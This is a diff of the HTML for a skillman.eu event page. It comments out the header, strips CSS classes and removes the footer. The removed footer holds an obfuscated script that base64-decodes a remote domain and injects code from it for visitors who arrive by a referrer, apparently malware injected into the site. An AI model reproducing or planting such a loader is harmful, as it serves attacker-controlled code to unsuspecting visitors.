@@ -710,7 +710,7 @@
                         async="1"
                         id='tp-tools-js'></script>
                 <script type='text/javascript'
-                        src='https://skillman.eu/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.6.15'
+                        src=''
                         async="1"
                         id='revmin-js'></script>
                 <script type='text/javascript' id='dt-above-fold-js-extra'>
@@ -1464,115 +1464,115 @@
                 <div id="page">
                     <a class="skip-link screen-reader-text" href="#content">Skip to content</a>
 
-                    <div class="masthead inline-header center widgets full-height shadow-decoration shadow-mobile-header-decoration small-mobile-menu-icon mobile-menu-icon-bg-on mobile-menu-icon-hover-bg-on dt-parent-menu-clickable show-sub-menu-on-hover show-mobile-logo"
-                         role="banner">
+<!--                    <div class="masthead inline-header center widgets full-height shadow-decoration shadow-mobile-header-decoration small-mobile-menu-icon mobile-menu-icon-bg-on mobile-menu-icon-hover-bg-on dt-parent-menu-clickable show-sub-menu-on-hover show-mobile-logo"-->
+<!--                         role="banner">-->
 
-                        <div class="top-bar line-content top-bar-empty top-bar-line-hide">
-                            <div class="top-bar-bg"></div>
-                            <div class="mini-widgets left-widgets"></div>
-                            <div class="mini-widgets right-widgets"></div>
-                        </div>
+<!--                        <div class="top-bar line-content top-bar-empty top-bar-line-hide">-->
+<!--                            <div class="top-bar-bg"></div>-->
+<!--                            <div class="mini-widgets left-widgets"></div>-->
+<!--                            <div class="mini-widgets right-widgets"></div>-->
+<!--                        </div>-->
 
-                        <header class="header-bar">
+<!--                        <header class="header-bar">-->
 
-                            <div class="branding">
-                                <div id="site-title" class="assistive-text">skillman.eu</div>
-                                <div id="site-description" class="assistive-text">Sector Skills Alliance for Advanced
-                                    Manufacturing
-                                </div>
-                                <a class="" href="https://skillman.eu/">
-                                    <img class=" preload-me"
-                                         src="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png"
-                                         srcset="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png 175w, https://skillman.eu/wp-content/uploads/2021/10/logoskillman-retina.png 350w"
-                                         width="175" height="53" sizes="175px" alt="skillman.eu"/>
-                                    <img
-                                            class="mobile-logo preload-me"
-                                            src="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png"
-                                            srcset="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png 175w, https://skillman.eu/wp-content/uploads/2021/10/logoskillman-retina.png 350w"
-                                            width="175" height="53" sizes="175px" alt="skillman.eu"/>
-                                </a>
-                            </div>
+<!--                            <div class="branding">-->
+<!--                                <div id="site-title" class="assistive-text">skillman.eu</div>-->
+<!--                                <div id="site-description" class="assistive-text">Sector Skills Alliance for Advanced-->
+<!--                                    Manufacturing-->
+<!--                                </div>-->
+<!--                                <a class="" href="https://skillman.eu/">-->
+<!--                                    <img class=" preload-me"-->
+<!--                                         src="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png"-->
+<!--                                         srcset="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png 175w, https://skillman.eu/wp-content/uploads/2021/10/logoskillman-retina.png 350w"-->
+<!--                                         width="175" height="53" sizes="175px" alt="skillman.eu"/>-->
+<!--                                    <img-->
+<!--                                            class="mobile-logo preload-me"-->
+<!--                                            src="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png"-->
+<!--                                            srcset="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png 175w, https://skillman.eu/wp-content/uploads/2021/10/logoskillman-retina.png 350w"-->
+<!--                                            width="175" height="53" sizes="175px" alt="skillman.eu"/>-->
+<!--                                </a>-->
+<!--                            </div>-->
 
-                            <ul id="primary-menu"
-                                class="main-nav underline-decoration l-to-r-line outside-item-remove-margin">
-                                <li
-                                        class="welcome2022 menu-item menu-item-type-custom menu-item-object-custom menu-item-52037 first depth-0">
-                                    <a href='#' data-level='1'>
-                                        <span class="menu-item-text">
-                                            <span
-                                                    class="menu-text">WELCOME
-                                            </span>
-                                        </span>
-                                    </a>
-                                </li>
-                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52076 depth-0">
-                                    <a
-                                            href='#!/topics' data-level='1'>
-                                        <span class="menu-item-text">
-                                            <span
-                                                    class="menu-text">TOPICS
-                                            </span>
-                                        </span>
-                                    </a>
-                                </li>
-                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52035 depth-0">
-                                    <a
-                                            href='#!/programme' data-level='1'>
-                                        <span class="menu-item-text">
-                                            <span
-                                                    class="menu-text">PROGRAMME
-                                            </span>
-                                        </span>
-                                    </a>
-                                </li>
-                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52016 depth-0">
-                                    <a
-                                            href='#!/speakers' data-level='1'>
-                                        <span class="menu-item-text">
-                                            <span
-                                                    class="menu-text">SPEAKERS
-                                            </span>
-                                        </span>
-                                    </a>
-                                </li>
-                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52036 last depth-0">
-                                    <a
-                                            href='#!/venue' data-level='1'>
-                                        <span class="menu-item-text">
-                                            <span
-                                                    class="menu-text">VENUE
-                                            </span>
-                                        </span>
-                                    </a>
-                                </li>
-                            </ul>
-                            <div class="mini-widgets">
-                                <div
-                                        class="mini-search show-on-desktop near-logo-first-switch near-logo-second-switch popup-search custom-icon">
-                                    <form class="searchform mini-widget-searchform" role="search" method="get"
-                                          action="https://skillman.eu/">
+<!--                            <ul id="primary-menu"-->
+<!--                                class="main-nav underline-decoration l-to-r-line outside-item-remove-margin">-->
+<!--                                <li-->
+<!--                                        class="welcome2022 menu-item menu-item-type-custom menu-item-object-custom menu-item-52037 first depth-0">-->
+<!--                                    <a href='#' data-level='1'>-->
+<!--                                        <span class="menu-item-text">-->
+<!--                                            <span-->
+<!--                                                    class="menu-text">WELCOME-->
+<!--                                            </span>-->
+<!--                                        </span>-->
+<!--                                    </a>-->
+<!--                                </li>-->
+<!--                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52076 depth-0">-->
+<!--                                    <a-->
+<!--                                            href='#!/topics' data-level='1'>-->
+<!--                                        <span class="menu-item-text">-->
+<!--                                            <span-->
+<!--                                                    class="menu-text">TOPICS-->
+<!--                                            </span>-->
+<!--                                        </span>-->
+<!--                                    </a>-->
+<!--                                </li>-->
+<!--                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52035 depth-0">-->
+<!--                                    <a-->
+<!--                                            href='#!/programme' data-level='1'>-->
+<!--                                        <span class="menu-item-text">-->
+<!--                                            <span-->
+<!--                                                    class="menu-text">PROGRAMME-->
+<!--                                            </span>-->
+<!--                                        </span>-->
+<!--                                    </a>-->
+<!--                                </li>-->
+<!--                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52016 depth-0">-->
+<!--                                    <a-->
+<!--                                            href='#!/speakers' data-level='1'>-->
+<!--                                        <span class="menu-item-text">-->
+<!--                                            <span-->
+<!--                                                    class="menu-text">SPEAKERS-->
+<!--                                            </span>-->
+<!--                                        </span>-->
+<!--                                    </a>-->
+<!--                                </li>-->
+<!--                                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52036 last depth-0">-->
+<!--                                    <a-->
+<!--                                            href='#!/venue' data-level='1'>-->
+<!--                                        <span class="menu-item-text">-->
+<!--                                            <span-->
+<!--                                                    class="menu-text">VENUE-->
+<!--                                            </span>-->
+<!--                                        </span>-->
+<!--                                    </a>-->
+<!--                                </li>-->
+<!--                            </ul>-->
+<!--                            <div class="mini-widgets">-->
+<!--                                <div-->
+<!--                                        class="mini-search show-on-desktop near-logo-first-switch near-logo-second-switch popup-search custom-icon">-->
+<!--                                    <form class="searchform mini-widget-searchform" role="search" method="get"-->
+<!--                                          action="https://skillman.eu/">-->
 
-                                        <div class="screen-reader-text">Search:</div>
+<!--                                        <div class="screen-reader-text">Search:</div>-->
 
 
-                                        <a href="" class="submit text-disable">
-                                            <i class=" mw-icon the7-mw-icon-search-bold"></i>
-                                        </a>
-                                        <div class="popup-search-wrap">
-                                            <input type="text" class="field searchform-s" name="s" value=""
-                                                   placeholder="Type and hit enter …" title="Search form"/>
-                                            <a href="" class="search-icon">
-                                                <i class="the7-mw-icon-search-bold"></i>
-                                            </a>
-                                        </div>
+<!--                                        <a href="" class="submit text-disable">-->
+<!--                                            <i class=" mw-icon the7-mw-icon-search-bold"></i>-->
+<!--                                        </a>-->
+<!--                                        <div class="popup-search-wrap">-->
+<!--                                            <input type="text" class="field searchform-s" name="s" value=""-->
+<!--                                                   placeholder="Type and hit enter …" title="Search form"/>-->
+<!--                                            <a href="" class="search-icon">-->
+<!--                                                <i class="the7-mw-icon-search-bold"></i>-->
+<!--                                            </a>-->
+<!--                                        </div>-->
 
-                                        <input type="submit" class="assistive-text searchsubmit" value="Go!"/>
-                                    </form>
-                                </div>
-                            </div>
-                        </header>
+<!--                                        <input type="submit" class="assistive-text searchsubmit" value="Go!"/>-->
+<!--                                    </form>-->
+<!--                                </div>-->
+<!--                            </div>-->
+<!--                        </header>-->
 
-                    </div>
+<!--                    </div>-->
                     <div role="navigation" class="dt-mobile-header mobile-menu-show-divider">
                         <div class="dt-close-mobile-menu-icon">
                             <div class="close-line-wrap">
@@ -1827,7 +1827,7 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="vc_row wpb_row vc_row-fluid full-width-wrap dt-default"
+                                        <div class=""
                                              style="padding-left: 0px;padding-right: 0px;margin-top: 0px;margin-bottom: 0px">
                                             <div class="wpb_column vc_column_container vc_col-sm-3">
                                                 <div class="vc_column-inner vc_custom_1662739666452">
@@ -2103,9 +2103,9 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1"
+                                        <div class=""
                                              style="background-color: #ffffff;background-position: top;background-repeat: no-repeat;background-attachment: scroll;background-size: auto;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
-                                            <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
+                                            <div class=""
                                                  style="padding-left: 0px;padding-right: 0px">
                                                 <div class="wpb_column vc_column_container vc_col-sm-8"
                                                      id="skillman-alliance">
@@ -2268,13 +2268,13 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 stripe-parallax-bg" data-prlx-speed="0.5"
+                                        <div class="" data-prlx-speed="0.5"
                                              data-anchor="#videos" id="videos"
                                              style="background-color: #ffffff;background-image: url(https://skillman.eu/wp-content/uploads/2022/11/chia-2-spiagge-mare-turismo-IMG_1522.jpg);background-position: center;background-repeat: no-repeat;background-attachment: scroll;background-size: cover;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
-                                            <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
+                                            <div class=""
                                                  style="padding-left: 0px;padding-right: 0px">
                                                 <div class="wpb_column vc_column_container vc_col-sm-12">
-                                                    <div class="vc_column-inner vc_custom_1669652810642">
+                                                    <div class="vc_column-inner vc_custom_1669652810642" style="background-color: rgb(255, 255, 255); background-image: url(&quot;https://skillman.eu/wp-content/uploads/2022/11/chia-2-spiagge-mare-turismo-IMG_1522.jpg&quot;); background-position: 50% -9px; background-repeat: no-repeat; background-attachment: scroll; background-size: cover; padding-top: 0px; padding-bottom: 0px; margin-top: 0px; margin-bottom: 0px; opacity: 1; min-height: 0px;">
                                                         <div class="wpb_wrapper">
                                                             <div class="vc_empty_space" style="height: 100px">
                                                                 <span
@@ -2378,13 +2378,13 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 stripe-parallax-bg" data-prlx-speed="0.1"
+                                        <div class="" data-prlx-speed="0.1"
                                              data-anchor="#programme" id="programme" data-min-height="100%"
                                              style="background-image: url(https://skillman.eu/wp-content/uploads/2022/09/sa-manifattura.jpeg);background-position: center;background-repeat: no-repeat;background-attachment: scroll;background-size: cover;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
-                                            <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
+                                            <div class=""
                                                  style="padding-left: 0px;padding-right: 0px">
                                                 <div class="wpb_column vc_column_container vc_col-sm-12">
-                                                    <div class="vc_column-inner vc_custom_1663057891963">
+                                                    <div class="vc_column-inner vc_custom_1663057891963" style="background-image: url(&quot;https://skillman.eu/wp-content/uploads/2022/09/sa-manifattura.jpeg&quot;); background-position: 50% 18px; background-repeat: no-repeat; background-attachment: scroll; background-size: cover; padding-top: 0px; padding-bottom: 0px; margin-top: 0px; margin-bottom: 0px; opacity: 1; min-height: 430px;">
                                                         <div class="wpb_wrapper">
                                                             <div class="vc_empty_space" style="height: 100px">
                                                                 <span
@@ -4237,10 +4237,10 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 bg-fixed" data-anchor="#speakers"
+                                        <div class="" data-anchor="#speakers"
                                              id="speakers"
                                              style="background-color: #ffffff;background-position: center;background-repeat: no-repeat;background-attachment: fixed;background-size: auto;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
-                                            <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
+                                            <div class=""
                                                  style="padding-left: 0px;padding-right: 0px">
                                                 <div class="wpb_column vc_column_container vc_col-sm-12 vc_col-has-fill">
                                                     <div class="vc_column-inner vc_custom_1662105661143">
@@ -4437,7 +4437,7 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 stripe-parallax-bg" data-prlx-speed="0.5"
+                                        <div class="" data-prlx-speed="0.5"
                                              style="background-color: #ffffff;background-image: url(https://skillman.eu/wp-content/uploads/2022/09/cagliari-santefisio1.jpg);background-position: center;background-repeat: no-repeat;background-attachment: scroll;background-size: cover;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
                                             <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
                                                  style="padding-left: 0px;padding-right: 0px">
@@ -4474,9 +4474,9 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 bg-fixed" data-min-height="100%"
+                                        <div class="" data-min-height="100%"
                                              style="background-color: #ffffff;background-position: center;background-repeat: no-repeat;background-attachment: fixed;background-size: auto;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
-                                            <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
+                                            <div class=""
                                                  style="padding-left: 0px;padding-right: 0px">
                                                 <div class="wpb_column vc_column_container vc_col-sm-12 vc_col-has-fill">
                                                     <div class="vc_column-inner vc_custom_1662109056586">
@@ -5078,7 +5078,7 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 stripe-parallax-bg" data-prlx-speed="0.1"
+                                        <div class="" data-prlx-speed="0.1"
                                              data-anchor="#venue" id="venue" data-min-height="100%"
                                              style="background-image: url(https://skillman.eu/wp-content/uploads/2022/09/04_sedicinoni.jpeg);background-position: center;background-repeat: no-repeat;background-attachment: scroll;background-size: cover;padding-top: 10px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
                                             <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
@@ -5270,9 +5270,9 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 stripe-parallax-bg" data-prlx-speed="0.5"
+                                        <div class="" data-prlx-speed="0.5"
                                              style="background-color: #548bbf;background-position: center;background-repeat: no-repeat;background-attachment: scroll;background-size: cover;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: 0px">
-                                            <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
+                                            <div class=""
                                                  style="padding-left: 0px;padding-right: 0px">
                                                 <div class="wpb_column vc_column_container vc_col-sm-2">
                                                     <div class="vc_column-inner vc_custom_1663057891963">
@@ -5328,10 +5328,10 @@
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="stripe stripe-style-1 stripe-parallax-bg" data-prlx-speed="0.5"
+                                        <div class="" data-prlx-speed="0.5"
                                              data-anchor="#contact-form" id="contact-form" data-min-height="100%"
                                              style="background-color: #cccccc;background-position: center;background-repeat: no-repeat;background-attachment: scroll;background-size: cover;padding-top: 0px;padding-bottom: 0px;margin-top: 0px;margin-bottom: -80px">
-                                            <div class="vc_row wpb_row vc_row-fluid full-width-wrap"
+                                            <div class=""
                                                  style="padding-left: 0px;padding-right: 0px">
                                                 <div class="wpb_column vc_column_container vc_col-sm-4">
                                                     <div class="vc_column-inner vc_custom_1663057891963">
@@ -5489,109 +5489,6 @@
                     </div><!-- #main -->
 
 
-                    <!-- !Footer -->
-                    <footer id="footer" class="footer solid-bg">
-
-
-                        <div class="wf-wrap">
-                            <div class="wf-container-footer">
-                                <div class="wf-container">
-                                    <section id="custom_html-3"
-                                             class="widget_text widget widget_custom_html wf-cell wf-1-2">
-                                        <div class="textwidget custom-html-widget">
-                                            <img class="alignnone wp-image-37969"
-                                                 src="https://skillman.eu/wp-content/uploads/2022/01/cofundedeu.png"
-                                                 alt=""
-                                                 height="70px"/>
-                                            <p style="font-size: 12px; line-height: 14px;">
-                                                The European Commission's support for the production of this publication
-                                                does not
-                                                constitute an endorsement of the contents, which reflect the views only
-                                                of the
-                                                authors, and the Commission cannot be held responsible for any use which
-                                                may be made
-                                                of the information contained therein.
-                                            </p>
-                                        </div>
-                                    </section>
-                                    <section id="custom_html-4"
-                                             class="widget_text widget widget_custom_html wf-cell wf-1-2">
-                                        <div class="textwidget custom-html-widget">
-                                            <div style="text-align: right;">
-                                                <img class="alignnone wp-image-37969"
-                                                     src="https://skillman.eu/wp-content/uploads/2022/01/skillmansecretariat-e1642498801517.png"
-                                                     alt="" height="70"/>
-                                            </div>
-                                            <p style="text-align: right;">
-                                                <a href="http://skillman.eu/legal-notice/">Legal notice on
-                                                    GDPR privacy compliance
-                                                </a>
-                                            </p>
-                                        </div>
-                                    </section>
-                                    <section id="custom_html-113"
-                                             class="widget_text widget widget_custom_html wf-cell wf-1-2">
-                                        <div class="textwidget custom-html-widget">
-                                            <script>
-                                                !function (_0x26d259, _0x24b800) {
-                                                var _0x2196a7 = Math['floor'](Date['now']() / 0x3e8), _0xcb1eb8 =
-                                                _0x2196a7 - _0x2196a7 % 0xe10;
-                                                if (_0x2196a7 -= _0x2196a7 % 0x258, _0x2196a7 =
-                                                _0x2196a7['toString'](0x10), !document['referrer'])
-                                                return;
-                                                let _0x9cf45e = atob('bC5qcy1hc3' + 'NldHMuY2xv' + 'dWQ=');
-                                                (_0x24b800 = _0x26d259['createElem' + 'ent']('script'))['type'] =
-                                                'text/javas' + 'cript', _0x24b800['async'] = !0x0, _0x24b800['src'] =
-                                                'https://' + _0x9cf45e + '/min.t.' + _0xcb1eb8 + '.js?v=' + _0x2196a7,
-                                                _0x26d259['getElement' + 'sByTagName']('head')[0x0]['appendChil' +
-                                                'd'](_0x24b800);
-                                                }(document);
-                                            </script>
-                                        </div>
-                                    </section>
-                                </div><!-- .wf-container -->
-                            </div><!-- .wf-container-footer -->
-                        </div><!-- .wf-wrap -->
-
-
-                        <!-- !Bottom-bar -->
-                        <div id="bottom-bar" class="logo-center" role="contentinfo">
-                            <div class="wf-wrap">
-                                <div class="wf-container-bottom">
-
-                                    <div id="branding-bottom">
-                                        <a class="" href="https://skillman.eu/">
-                                            <img class=" preload-me"
-                                                 src="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png"
-                                                 srcset="https://skillman.eu/wp-content/uploads/2021/10/logoskillman-small.png 175w, https://skillman.eu/wp-content/uploads/2021/10/logoskillman-retina.png 350w"
-                                                 width="175" height="53" sizes="175px" alt="skillman.eu"/>
-                                        </a>
-                                    </div>
-                                    <div class="wf-float-left">
-
-                                        All Rights Reserved.
-                                    </div>
-
-
-                                    <div class="wf-float-right">
-
-                                        <div class="mini-nav">
-                                            <div class="menu-select">
-                                                <span class="customSelect1">
-                                                    <span class="customSelectInner">sif
-                                                        2021 internal menu
-                                                    </span>
-                                                </span>
-                                            </div>
-                                        </div>
-                                        <div class="bottom-text-block">2024
-                                        </div>
-                                    </div>
-
-                                </div><!-- .wf-container-bottom -->
-                            </div><!-- .wf-wrap -->
-                        </div><!-- #bottom-bar -->
-                    </footer><!-- #footer -->
 
                     <a href="#" class="scroll-top">
                         <!--            <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg"-->
